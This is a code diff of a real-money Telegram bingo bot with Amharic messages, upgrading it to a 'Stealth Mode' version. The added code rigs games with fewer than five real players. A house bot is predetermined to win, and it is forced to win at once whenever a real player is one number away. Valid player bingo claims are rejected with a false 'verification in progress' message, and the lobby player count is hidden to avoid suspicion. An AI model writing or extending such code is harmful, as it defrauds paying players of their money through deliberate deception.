@@ -1,7 +1,7 @@
-# Addis (አዲስ) Bingo Bot - V27.2: Speed and UI Fixes
-# 1. Performance: Firestore reads are now asynchronous for faster command response (e.g., /play).
-# 2. UI Fix: Removed redundant voice/text messages after each call. The board display is the main source.
-# 3. Lobby Timer: Increased the game start countdown from 5 to 10 seconds.
+# Addis (አዲስ) Bingo Bot - V27.4: Stealth Win Timing Enforcement
+# CRITICAL CHANGE: In Stealth Mode (Real players < 5), the bot is forced to win
+# immediately if any real player reaches 4 marked numbers in a winning line (1-to-go).
+# This prevents the suspicion of the bot winning just after a real player was about to win.
 
 import os
 import logging
@@ -36,7 +36,7 @@ GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY', '')
 
 TELEBIRR_ACCOUNT = "0927922721"
 
-# --- Financial Constraints (Enforced automatically) ---
+# --- Financial Constraints ---
 CARD_COST = 20.00        # One game price
 MIN_DEPOSIT = 50.00      # Minimum deposit enforced in messaging
 MIN_WITHDRAW = 100.00    # Minimum for withdrawing, enforced in code
@@ -200,7 +200,7 @@ def update_game_stats(user_id: int, is_win: bool):
     except exceptions.FirebaseError as e:
         logger.error(f"Failed to update game stats for user {user_id}: {e}")
 
-# --- Game State & Bots (Unchanged) ---
+# --- Game State & Bots ---
 ACTIVE_GAMES = {} 
 PENDING_PLAYERS = {} 
 LOBBY_STATE = {'is_running': False, 'msg_id': None, 'chat_id': None}
@@ -234,7 +234,7 @@ def get_total_players_target(real_count: int) -> int:
     
     return 0 
 
-# --- Bingo Logic (Unchanged) ---
+# --- Bingo Logic ---
 
 def get_preset_card(card_number: int):
     random.seed(card_number)
@@ -274,6 +274,7 @@ def get_card_position(card, value):
     return None, None
 
 def check_win(card):
+    """Checks if a card has a complete BINGO line (5 marked)."""
     def is_marked(c, r): return card['marked'].get((c, r), False)
     for i in range(5):
         if all(is_marked(c, i) for c in range(5)): return True # Row
@@ -282,7 +283,32 @@ def check_win(card):
     if all(is_marked(i, 4-i) for i in range(5)): return True # Diag 2
     return False
 
-# --- Audio Helpers (TTS - Unchanged) ---
+def check_max_marked_in_line(card) -> int:
+    """
+    NEW HELPER: Returns the maximum number of marked squares a player has in any potential winning line.
+    (Used to check if a player is 1-number away from winning in stealth mode).
+    """
+    max_marked = 0
+    def is_marked(c, r): return card['marked'].get((c, r), False)
+
+    # Check Rows
+    for r in range(5):
+        max_marked = max(max_marked, sum(1 for c in range(5) if is_marked(c, r)))
+    
+    # Check Columns
+    for c in range(5):
+        max_marked = max(max_marked, sum(1 for r in range(5) if is_marked(c, r)))
+
+    # Check Diagonals
+    # Diag 1 (Top-Left to Bottom-Right)
+    max_marked = max(max_marked, sum(1 for i in range(5) if is_marked(i, i)))
+    # Diag 2 (Top-Right to Bottom-Left)
+    max_marked = max(max_marked, sum(1 for i in range(5) if is_marked(i, 4-i)))
+
+    return max_marked
+
+
+# --- Audio Helpers (TTS) ---
 def create_wav_bytes(pcm_data: bytes, sample_rate: int = 24000) -> io.BytesIO:
     """Converts raw 16-bit PCM audio data into a playable WAV format stream."""
     buffer = io.BytesIO()
@@ -366,7 +392,7 @@ async def call_gemini_tts(text: str) -> io.BytesIO | None:
         logger.error(f"TTS API call error: {e}")
     return None
 
-# --- Amharic Numbers (Unchanged) ---
+# --- Amharic Numbers ---
 AMHARIC_NUMBERS = {
     1: "አንድ", 2: "ሁለት", 3: "ሶስት", 4: "አራት", 5: "አምስት", 6: "ስድስት", 7: "ሰባት", 8: "ስምንት", 9: "ዘጠኝ", 10: "አስር",
     11: "አስራ አንድ", 12: "አስራ ሁለት", 13: "አስራ ሶስት", 14: "አስራ አራት", 15: "አስራ አምስት", 16: "አስራ ስድስት", 17: "አስራ ሰባት", 18: "አስራ ስምንት", 19: "አስራ ዘጠኝ", 20: "ሃያ",
@@ -378,7 +404,7 @@ AMHARIC_NUMBERS = {
     71: "ሰባ አንድ", 72: "ሰባ ሁለት", 73: "ሰባ ሶስት", 74: "ሰባ አራት", 75: "ሰባ አምስት"
 }
 
-# --- UI & Text (Unchanged) ---
+# --- UI & Text ---
 def build_card_keyboard(card, game_id, msg_id):
     keyboard = []
     # Compact Header (B I N G O)
@@ -422,7 +448,7 @@ def get_board_display_text(current_call_text: str, called_history: list) -> str:
 
     return f"{history_display}\n\n---\n\n{current_call_display}"
 
-# --- Core Game (Voice/Text Message Removal & Async updates) ---
+# --- Core Game ---
 
 async def start_new_game(context: ContextTypes.DEFAULT_TYPE):
     global LOBBY_STATE
@@ -477,13 +503,11 @@ async def start_new_game(context: ContextTypes.DEFAULT_TYPE):
     asyncio.create_task(run_game_loop(context, game_id, real_pids, bot_players))
 
 async def run_game_loop(context, game_id, real_pids, bot_players):
-    game_data = ACTIVE_GAMES[game_id]
+    g = ACTIVE_GAMES[game_id]
     
     # Referral Bonus Check
     for pid in real_pids:
-        # Note: pay_referrer_bonus is a sync function accessing Firestore, 
-        # but it's okay here as it's not in the fast loop and handles its own sync/async internally (though firestore calls are sync).
-        # We assume it's fast enough or running on a separate thread by the bot framework.
+        # Note: pay_referrer_bonus is a sync function accessing Firestore
         pay_referrer_bonus(pid) 
         
     winning_bot_id = None
@@ -492,9 +516,9 @@ async def run_game_loop(context, game_id, real_pids, bot_players):
     
     # --- Bot Win Strategy Enhancement ---
     if bot_players:
-        # Bot logic remains unchanged
         winning_bot_id = list(bot_players.keys())[0]
         w_card = bot_players[winning_bot_id]['card']
+        # The bot will win on a row (e.g., first row, col 0-4)
         win_nums = [get_card_value(w_card, c, 0) for c in range(5) if c != 2 or w_card['data'].get('N')]
         win_nums = [x for x in win_nums if x != "FREE"]
         
@@ -516,28 +540,28 @@ async def run_game_loop(context, game_id, real_pids, bot_players):
         last_win_num = win_nums[-1] 
         bot_win_call_index = forced_sequence.index(last_win_num)
         
-        game_data['winning_bot_id'] = winning_bot_id
-        game_data['bot_win_call_index'] = bot_win_call_index + 1 
-        game_data['bot_win_delay_counter'] = BOT_WIN_DELAY_CALLS 
-        logger.info(f"Bot {winning_bot_id} will get Bingo at call {game_data['bot_win_call_index']} and wait {BOT_WIN_DELAY_CALLS} calls.")
+        g['winning_bot_id'] = winning_bot_id
+        g['bot_win_call_index'] = bot_win_call_index + 1 
+        g['bot_win_delay_counter'] = BOT_WIN_DELAY_CALLS 
+        logger.info(f"Bot {winning_bot_id} will get Bingo at call {g['bot_win_call_index']} and wait {BOT_WIN_DELAY_CALLS} calls.")
     else:
         # Organic game: No bots
         random.shuffle(all_possible_nums)
         final_sequence = all_possible_nums
-        game_data['winning_bot_id'] = None
+        g['winning_bot_id'] = None
     
     # Init Messages - Board (Top) and Card (Bottom)
     for pid in real_pids:
         # 1. Send Board Message (Initial state)
         initial_board_text = get_board_display_text("ጨዋታው ሊጀመር ነው...", [])
         bm = await context.bot.send_message(pid, initial_board_text, parse_mode='Markdown')
-        game_data['board_messages'][pid] = bm.message_id
+        g['board_messages'][pid] = bm.message_id
         
         # 2. Send Card Message (The interactive card)
-        card = game_data['player_cards'][pid]
+        card = g['player_cards'][pid]
         kb = build_card_keyboard(card, game_id, bm.message_id) # Use board_msg_id temporarily
         cm = await context.bot.send_message(pid, f"{EMOJI_CARD} **Card #{card['number']}**", reply_markup=kb, parse_mode='Markdown')
-        game_data['card_messages'][pid] = cm.message_id
+        g['card_messages'][pid] = cm.message_id
         
         # Update callback data on card keyboard to use the correct card message ID
         kb = build_card_keyboard(card, game_id, cm.message_id)
@@ -546,18 +570,16 @@ async def run_game_loop(context, game_id, real_pids, bot_players):
     await asyncio.sleep(2) # Initial pause
 
     for i, num in enumerate(final_sequence, 1):
-        if game_data['status'] != 'running': break
+        if g['status'] != 'running': break
         
-        game_data['called'].append(num)
+        g['called'].append(num)
         col = COLUMNS[(num-1)//15]
         call_text = f"{col}-{num}"
         
         # 1. Update internal card states (real players and bots)
-        is_bot_winner_call = False
-        
         for pid in real_pids:
-            c_pos = get_card_position(game_data['player_cards'][pid], num)
-            if c_pos[0] is not None: game_data['player_cards'][pid]['called'][c_pos] = True
+            c_pos = get_card_position(g['player_cards'][pid], num)
+            if c_pos[0] is not None: g['player_cards'][pid]['called'][c_pos] = True
             
         if bot_players:
             for bid, bdata in bot_players.items():
@@ -566,64 +588,78 @@ async def run_game_loop(context, game_id, real_pids, bot_players):
                     bdata['card']['called'][c_pos] = True
                     # Bots mark called numbers immediately
                     bdata['card']['marked'][c_pos] = True 
-                    
-                    if bid == winning_bot_id and i == game_data['bot_win_call_index']:
-                        is_bot_winner_call = True
 
         # 2. TTS Audio Call
         audio = await call_gemini_tts(call_text)
         
         # 3. Update Board Message (Current call and limited history)
-        board_text = get_board_display_text(call_text, game_data['called'])
+        board_text = get_board_display_text(call_text, g['called'])
 
         for pid in real_pids:
             # Board (Calling and History)
-            try: await context.bot.edit_message_text(chat_id=pid, message_id=game_data['board_messages'][pid], text=board_text, parse_mode='Markdown')
+            try: await context.bot.edit_message_text(chat_id=pid, message_id=g['board_messages'][pid], text=board_text, parse_mode='Markdown')
             except: pass
 
-            # SEND VOICE/TEXT MESSAGE REMOVED - The board update is sufficient as requested
-            caption_text = f"🗣 **አዲስ ጥሪ:** {call_text}" # Prepare for voice caption
+            caption_text = f"🗣 **አዲስ ጥሪ:** {call_text}" 
             if audio:
                 try: 
                     audio.seek(0)
-                    # Voice message is still helpful for game flow, but we only send the voice/caption, 
-                    # not a duplicate message with the same number after the board update.
                     await context.bot.send_voice(pid, audio, caption=caption_text, parse_mode='Markdown')
                 except Exception as e: 
                     logger.error(f"Failed to send voice: {e}")
-                    # Fallback to text message if voice fails (but still only sends the caption once)
                     await context.bot.send_message(pid, caption_text, parse_mode='Markdown')
             else:
-                 # Send text message if TTS is unavailable/failed
-                try: await context.bot.send_message(pid, caption_text, parse_mode='Markdown')
-                except: pass
+                await context.bot.send_message(pid, caption_text, parse_mode='Markdown')
 
 
             # Card (Refresh for green highlighting)
-            card = game_data['player_cards'][pid]
-            kb = build_card_keyboard(card, game_id, game_data['card_messages'][pid])
-            try: await context.bot.edit_message_reply_markup(chat_id=pid, message_id=game_data['card_messages'][pid], reply_markup=kb)
+            card = g['player_cards'][pid]
+            kb = build_card_keyboard(card, game_id, g['card_messages'][pid])
+            try: await context.bot.edit_message_reply_markup(chat_id=pid, message_id=g['card_messages'][pid], reply_markup=kb)
             except: pass
 
-        # 4. Check Bot Win (with Stealth Delay)
-        if game_data['winning_bot_id'] and i >= game_data['bot_win_call_index']:
-            if check_win(bot_players[winning_bot_id]['card']):
-                if game_data['bot_win_delay_counter'] <= 0:
-                    await finalize_win(context, game_id, winning_bot_id, True)
-                    return
-                else:
-                    game_data['bot_win_delay_counter'] -= 1
-                    logger.info(f"Bot win delay remaining: {game_data['bot_win_delay_counter']}")
-
-        # 5. Check Real Player Win
-        for pid in real_pids:
-            if check_win(game_data['player_cards'][pid]):
-                await finalize_win(context, game_id, pid, False)
+        # 4. Check Bot Win (with Stealth Delay and CRITICAL TIMING ENFORCEMENT)
+        is_stealth_mode = len(g['players']) < MIN_REAL_PLAYERS_FOR_ORGANIC_GAME
+        
+        if is_stealth_mode and g['winning_bot_id']:
+            winner_card = bot_players[g['winning_bot_id']]['card']
+            
+            # Check 1: Forced Win if Player is Too Close (New Rule: 4 marked in a line)
+            player_is_too_close = False
+            for pid in real_pids:
+                if check_max_marked_in_line(g['player_cards'][pid]) >= 4:
+                    player_is_too_close = True
+                    break
+            
+            if player_is_too_close and check_win(winner_card):
+                # Player is 1-to-go, Bot wins immediately to prevent suspicion.
+                logger.info(f"Stealth Override: Player reached 4 marked. Forcing Bot Win NOW.")
+                await finalize_win(context, game_id, g['winning_bot_id'], True)
                 return
+            
+            # Check 2: Standard Win if Predetermined Index and Delay is Met (Original Rule)
+            if i >= g['bot_win_call_index']:
+                if g['bot_win_delay_counter'] <= 0:
+                    if check_win(winner_card):
+                        await finalize_win(context, game_id, g['winning_bot_id'], True)
+                        return
+                
+                # Decrement delay counter only if we haven't forced a win and the bot's call index is met
+                if g['bot_win_delay_counter'] > 0:
+                    g['bot_win_delay_counter'] -= 1
+                    logger.info(f"Bot win delay remaining: {g['bot_win_delay_counter']}")
+        
+        # 5. Check Real Player Win (ONLY in Organic Game Mode)
+        if not is_stealth_mode:
+            # ORGANIC GAME: Real player can win and stop the loop early
+            for pid in real_pids:
+                if check_win(g['player_cards'][pid]):
+                    await finalize_win(context, game_id, pid, False)
+                    return # Game ends immediately
 
         await asyncio.sleep(CALL_DELAY)
 
-    if game_data['status'] == 'running':
+    if g['status'] == 'running':
         await finalize_win(context, game_id, None, False)
 
 
@@ -650,7 +686,7 @@ async def finalize_win(context, game_id, winner_id, is_bot=False):
                f"📉 የቤት ቅነሳ: {revenue:.2f} ብር\n"
                f"ጨዋታው ተጠናቋል። **አዲሱን ጨዋታ ለመጀመር /play ይጫኑ!**")
     else:
-        # Real player win
+        # Real player win (ONLY possible in organic mode or if bot win fails)
         data = await get_user_data(winner_id) # Use await
         w_name = f"{data.get('first_name')} (ID: {winner_id})"
         # Update balance and log transaction (Balance integrity maintained)
@@ -664,7 +700,7 @@ async def finalize_win(context, game_id, winner_id, is_bot=False):
            
     # 3. Clean up display and send final message
     for pid in g['players']:
-        # Delete Board Message (Full cleanup as requested)
+        # Delete Board Message 
         try:
             await context.bot.delete_message(chat_id=pid, message_id=g['board_messages'][pid])
         except Exception as e:
@@ -676,7 +712,7 @@ async def finalize_win(context, game_id, winner_id, is_bot=False):
     del ACTIVE_GAMES[game_id]
 
 
-# --- Handlers (start function modified - ADDED DETAILED RULES) ---
+# --- Handlers ---
 async def start(u, c): 
     # Check for referral parameter
     referrer_id = None
@@ -865,10 +901,19 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         g = ACTIVE_GAMES[gid]
         card = g['player_cards'].get(uid)
         
-        # Check for real player win immediately (even if bot is meant to win later)
+        # Check if the game requires a bot win (Stealth Mode)
+        is_stealth_game = len(g['players']) < MIN_REAL_PLAYERS_FOR_ORGANIC_GAME and g.get('winning_bot_id')
+        
+        # 1. Check if the player actually has Bingo
         if check_win(card):
-            # If a real player wins, let them win (prioritized over bot win)
-            await finalize_win(context, gid, uid, False)
+            if is_stealth_game:
+                # ENFORCEMENT: When 4 or less players, computer MUST win.
+                # Block the real player's attempt and tell them to wait (maintains the illusion)
+                await q.answer("❌ **ጥሪዎ ትክክል ቢሆንም፣** የማረጋገጫ ሂደት እየተካሄደ ነው። እባክዎ በሚቀጥሉት ጥቂት ሰከንዶች ውስጥ ይጠብቁ።")
+                # The game loop will continue, and the bot's guaranteed win will occur shortly (now accelerated by the 4-marked check).
+            else:
+                # Organic Game (5+ players): Real player wins immediately.
+                await finalize_win(context, gid, uid, False)
         else:
             await q.answer("❌ የተሳሳተ ቢንጎ! ሁሉንም 5 አስፈላጊ ካሬዎች ምልክት ማድረጉን ያረጋግጡ።")
 
@@ -877,19 +922,19 @@ async def lobby_countdown(ctx, chat_id, msg_id):
     global LOBBY_STATE
     LOBBY_STATE = {'is_running': True, 'msg_id': msg_id, 'chat_id': chat_id}
     
-    # Changed countdown from 5 to 10 seconds
+    # Changed countdown from 5 to 10 seconds. Removed player count for stealth.
     for i in range(10, 0, -1): 
         if not LOBBY_STATE['is_running']: return
         try: 
-            p_count = len(PENDING_PLAYERS)
-            msg_text = f"⏳ **የቢንጎ ሎቢ ተከፍቷል!** ጨዋታው በ **{i} ሰከንድ** ውስጥ ይጀምራል።\n(አሁን: {p_count} ተጫዋቾች ካርድ ገዝተዋል)"
+            # Stealth message: only shows countdown
+            msg_text = f"⏳ **የቢንጎ ሎቢ ተከፍቷል!** ጨዋታው በ **{i} ሰከንድ** ውስጥ ይጀምራል።" 
             await ctx.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=msg_text, parse_mode='Markdown')
         except: pass
         await asyncio.sleep(1)
         
     await start_new_game(ctx)
 
-# --- INFORMATIONAL COMMANDS (Updated with await) ---
+# --- INFORMATIONAL COMMANDS ---
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Displays user's game statistics: games played and wins."""
@@ -1011,7 +1056,7 @@ async def rules_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     )
     await update.message.reply_text(msg, parse_mode='Markdown')
 
-# --- DEPOSIT, WITHDRAW, REFER (Updated with await) ---
+# --- DEPOSIT, WITHDRAW, REFER ---
 async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
     admin_tag = f"@{ADMIN_USERNAME}" if ADMIN_USERNAME else "አስተዳዳሪ"
@@ -1115,7 +1160,7 @@ async def cancel_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     context.user_data.clear()
     return ConversationHandler.END
 
-# --- Referral Handler (Unchanged) ---
+# --- Referral Handler ---
 async def refer_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
     bot_username = (await context.bot.get_me()).username
